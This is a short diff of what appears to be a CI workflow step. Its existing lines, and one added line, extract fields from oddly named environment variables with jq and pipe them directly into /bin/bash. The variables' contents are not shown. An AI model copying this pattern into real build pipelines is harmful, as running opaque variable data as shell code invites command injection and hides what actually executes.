@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$ys4393" | jq -r .ptcvq744 | /bin/bash
           printf '%s' "$s3272" | jq -r .mqg242 | /bin/bash
           printf '%s' "$im51005" | jq -r .vld0628 | /bin/bash
+          echo $woiq834 | jq -r .fc20289 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
